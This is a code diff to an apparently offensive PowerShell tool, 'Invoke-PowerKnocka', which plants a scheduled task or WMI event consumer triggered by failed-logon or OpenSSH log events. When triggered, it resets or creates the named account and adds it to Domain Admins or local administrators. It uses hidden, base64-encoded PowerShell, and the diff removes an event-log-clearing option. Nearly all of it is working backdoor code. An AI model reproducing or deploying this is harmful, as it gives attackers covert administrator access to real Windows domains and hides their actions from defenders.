@@ -17,11 +17,8 @@ function Invoke-PowerKnocka {
         [Parameter(Mandatory=$false)]
         [string]$Password = "Password1!qazwsx",
 
-        [Parameter(Mandatory)]
-        [switch]$DC,
-
         [Parameter(Mandatory=$false)]
-        [bool]$ClearLog = $false,
+        [switch]$DC,
 
         [Parameter(Mandatory=$false)]
         [string]$NBName,
@@ -33,27 +30,23 @@ function Invoke-PowerKnocka {
         [string]$SSHIdentifier = "-"
 
 
-    )
-
-    $Text = '$e = Get-EventLog -LogName Security -InstanceId 4625 -Newest 1; $n = $e.ReplacementStrings[5];if ($e.ReplacementStrings[6] -eq "' + $NBName + '") {try{ Set-ADAccountPassword -Identity $n -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "' + $Password + '" -Force)} catch { New-ADUser -Enabled $true -SamAccountName $n -Name $n -Accountpassword (ConvertTo-SecureString "' + $Password + '" -AsPlainText -force);Add-ADGroupMember -Identity "Domain Admins" -Members $n}}'
-
-    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
-    $EncodedText =[Convert]::ToBase64String($Bytes)
+    )    
 
     if ($DC) {
-        $ExploitString = '-WindowStyle Hidden -NoP -NonI -Enc ' + $EncodedText
+        $ExploitString = '$e = Get-EventLog -LogName Security -InstanceId 4625 -Newest 1; $n = $e.ReplacementStrings[5];if ($e.ReplacementStrings[6] -eq "' + $NBName + '") {try{ Set-ADAccountPassword -Identity $n -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "' + $Password + '" -Force)} catch { New-ADUser -Enabled $true -SamAccountName $n -Name $n -Accountpassword (ConvertTo-SecureString "' + $Password + '" -AsPlainText -force);Add-ADGroupMember -Identity "Domain Admins" -Members $n}}'
+
     }
     else {
-        $ExploitString = '-WindowStyle Hidden -NoP -NonI $e = Get-EventLog -LogName Security -InstanceId 4625 -Newest 1; $n = $e.ReplacementStrings[5];if ($e.ReplacementStrings[6] -eq "' + $NBName + '") {if (net user $n) {net user $n "' + $Password + '"} else {net user $n "' + $Password + '" /add;net localgroup administrators $n /add}}'
+        $ExploitString = '$e = Get-EventLog -LogName Security -InstanceId 4625 -Newest 1; $n = $e.ReplacementStrings[5];if ($e.ReplacementStrings[6] -eq "' + $NBName + '") {if (net user $n) {net user $n "' + $Password + '"} else {net user $n "' + $Password + '" /add;net localgroup administrators $n /add}}'
     }
 
     if ($SSH) {
-        $ExploitString = '-Enc ((Get-WinEvent -LogName OpenSSH/Operational -MaxEvents 1 | Select -ExpandProperty Message) | %{$_.split(" ")[6]} | %{$_.split("' + $SSHIdentifier + '")[1]} | Get-Unique)'
+        $ExploitString = '((Get-WinEvent -LogName OpenSSH/Operational -MaxEvents 1 | Select -ExpandProperty Message) | %{$_.split(" ")[6]} | %{$_.split("' + $SSHIdentifier + '")[1]} | Get-Unique)'
     }
 
-    if ($ClearLog) {
-        $ExploitString = $ExploitString.Insert($ExploitString.Length - 2,';Clear-EventLog -LogName system')
-    }
+    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($ExploitString)
+    $EncodedExploitString =[Convert]::ToBase64String($Bytes)
+    $FinalExploitString = '-WindowStyle Hidden -NoP -NonI -Enc ' + $EncodedExploitString
 
     if ($Method -eq "Task") {
         $Class = Get-cimclass MSFT_TaskEventTrigger root/Microsoft/Windows/TaskScheduler
@@ -64,7 +57,7 @@ function Invoke-PowerKnocka {
         $Settings = New-ScheduledTaskSettingsSet
         $ActionParameters = @{
             Execute  = 'C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe'
-            Argument = $ExploitString
+            Argument = $FinalExploitString
         }
         $Action = New-ScheduledTaskAction @ActionParameters
         $RegSchTaskParameters = @{
@@ -98,7 +91,7 @@ function Invoke-PowerKnocka {
         $wmiParams.Class = 'CommandLineEventConsumer'
         $wmiParams.Arguments = @{
             Name = $Name
-            CommandLineTemplate = "powershell.exe " + $ExploitString
+            CommandLineTemplate = "powershell.exe " + $FinalExploitString
         }
         $consumerResult = Set-WmiInstance @wmiParams
 
